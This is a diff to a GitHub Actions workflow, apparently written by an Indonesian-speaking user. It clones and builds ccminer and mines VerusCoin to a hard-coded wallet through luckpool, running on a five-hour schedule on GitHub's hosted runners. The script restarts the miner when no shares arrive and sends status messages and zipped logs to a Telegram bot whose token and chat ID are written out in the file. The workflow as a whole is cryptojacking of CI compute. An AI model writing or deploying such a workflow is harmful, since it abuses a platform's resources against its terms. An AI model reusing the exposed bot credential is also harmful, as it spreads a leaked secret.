@@ -1,53 +1,98 @@
-name: VerusCoin Miner (GH Action)
+name: VerusCoin Mining
 
 on:
   workflow_dispatch:
   schedule:
-    - cron: "0 */6 * * *"
-
-env:
-  WALLET: RGVmtuvrP2yX8q3U4up77CcSpkcVhp4bUG
-  TELEGRAM_TOKEN: 7548058927:AAF-fL3P6W5sNxbzbmwwtsfVxPZubdIybzc
-  TELEGRAM_CHAT_ID: 5763229296
+    - cron: '0 */5 * * *'  # Setiap 5 jam
 
 jobs:
   mine:
     runs-on: ubuntu-latest
-    timeout-minutes: 350
+    timeout-minutes: 300
 
     steps:
-      - name: 🧰 Install dependencies
-        run: |
-          sudo apt update
-          sudo apt install -y \
-            build-essential git cmake automake libtool autoconf pkg-config \
-            libcurl4-openssl-dev
+    - name: Install dependencies
+      run: |
+        sudo apt update
+        sudo apt install -y git build-essential automake libcurl4-openssl-dev cmake screen zip
 
-      - name: ⛏️ Clone & build miner
-        run: |
-          git clone https://github.com/monkins1010/ccminer.git
-          cd ccminer
-          chmod +x build.sh
-          ./build.sh
+    - name: Clone and build ccminer
+      run: |
+        git clone https://github.com/veruscoin/ccminer.git
+        cd ccminer
+        ./build.sh
 
-      - name: 🚀 Start mining (with auto restart)
-        run: |
-          echo "Mining started at $(date)"
-          echo "Worker: github-${{ github.run_id }}"
+    - name: Start mining
+      run: |
+        WORKER="GH-${GITHUB_RUN_ID}"
+        WALLET="RGVmtuvrP2yX8q3U4up77CcSpkcVhp4bUG"
+        TELEGRAM_TOKEN="7548058927:AAF-fL3P6W5sNxbzbmwwtsfVxPZubdIybzc"
+        TELEGRAM_CHAT_ID="5763229296"
+        MAX_IDLE=600  # 10 menit
+        NOTIF_INTERVAL=3600  # 1 jam
 
-          curl -s -X POST https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage \
-            -d chat_id=${TELEGRAM_CHAT_ID} \
-            -d text="🟢 Mining started on GitHub Actions\n🧱 Wallet: ${WALLET}\n👷 Worker: github-${{ github.run_id }}"
+        send_text() {
+          curl -s -X POST "https://api.telegram.org/bot$TELEGRAM_TOKEN/sendMessage" \
+            -d chat_id="$TELEGRAM_CHAT_ID" \
+            -d parse_mode="Markdown" \
+            -d text="$1"
+        }
 
-          cd ccminer
-          while true; do
-            ./ccminer -a verus \
-              -o stratum+tcp://na.luckpool.net:3956 \
-              -u ${WALLET}.github-${{ github.run_id }} \
-              -p x -t 1 | tee miner.log
+        send_file() {
+          curl -s -F chat_id="$TELEGRAM_CHAT_ID" \
+            -F document=@"$1" \
+            https://api.telegram.org/bot$TELEGRAM_TOKEN/sendDocument
+        }
 
-            curl -s -X POST https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendDocument \
-              -F chat_id=${TELEGRAM_CHAT_ID} \
-              -F document=@miner.log \
-              -F caption="🔁 Miner restarted at $(date)"
+        cd ccminer
+
+        while true; do
+          LOG_FILE="log_$WORKER.txt"
+          rm -f "$LOG_FILE"
+          START_TIME=$(date +%s)
+          LAST_ACCEPTED=$START_TIME
+          LAST_NOTIF=$START_TIME
+
+          send_text "🟢 *Mining started*\nWorker: *$WORKER*\nThreads: 2"
+
+          ./ccminer -a verus -o stratum+tcp://ap.luckpool.net:3956 -u $WALLET.$WORKER -p x -t 2 | tee "$LOG_FILE" &
+
+          PID=$!
+
+          while sleep 60; do
+            if ! kill -0 $PID 2>/dev/null; then
+              send_text "🔴 *Miner crashed unexpectedly*\nRestarting..."
+              break
+            fi
+
+            NOW=$(date +%s)
+            LAST_LINE=$(tail -n 1 "$LOG_FILE")
+            SHARES=$(grep -c "accepted" "$LOG_FILE")
+
+            # Update waktu terakhir accepted
+            if echo "$LAST_LINE" | grep -q "accepted"; then
+              LAST_ACCEPTED=$NOW
+            fi
+
+            # Jika idle lebih dari 10 menit, restart
+            if [ $((NOW - LAST_ACCEPTED)) -gt $MAX_IDLE ]; then
+              send_text "⚠️ *No shares for 10 minutes*\nRestarting miner...\nShares so far: $SHARES"
+              kill $PID
+              break
+            fi
+
+            # Notifikasi tiap 1 jam
+            if [ $((NOW - LAST_NOTIF)) -ge $NOTIF_INTERVAL ]; then
+              send_text "ℹ️ *1 Hour Update*\nWorker: *$WORKER*\nAccepted shares: $SHARES"
+              LAST_NOTIF=$NOW
+            fi
           done
+
+          # Kirim log
+          zip log_${WORKER}.zip "$LOG_FILE"
+          send_file "log_${WORKER}.zip"
+
+          # Sesi selesai
+          send_text "✅ *Session ended*\nWorker: *$WORKER*\nTotal shares: $SHARES\nRestarting..."
+
+        done
